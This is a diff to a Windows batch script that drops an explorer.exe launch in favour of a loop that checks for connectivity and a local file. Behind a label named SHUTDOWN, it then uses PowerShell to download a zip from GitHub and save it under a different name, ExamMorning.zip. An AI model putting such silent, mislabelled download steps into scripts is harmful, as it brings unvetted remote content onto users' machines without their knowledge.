@@ -1,2 +1,30 @@
 @echo off
-%SystemRoot%\explorer.exe "
+cls
+
+:START
+
+SET MYFILE="C:\ISO\shutdown.bat"
+SET option=0
+
+IF NOT EXIST %MYFILE% SET option=2
+IF EXIST %MYFILE% goto connected
+
+ping -n 1 www.google.com | findstr TTL && goto connected
+ping -n 1 www.google.com | findstr TTL || goto Disconnected
+
+:connected
+SET option=1
+IF %option%==1 GOTO:SHUTDOWN
+
+:Disconnected
+SET option=2
+
+timeout /t 60
+GOTO:START
+:SHUTDOWN
+powershell -Command "Invoke-WebRequest https://github.com/ParwezCS/zhilwan.zip/raw/main/sardam.zip -Outfile C:\ISO\ExamMorning.zip"
+pause
+
+
+
+
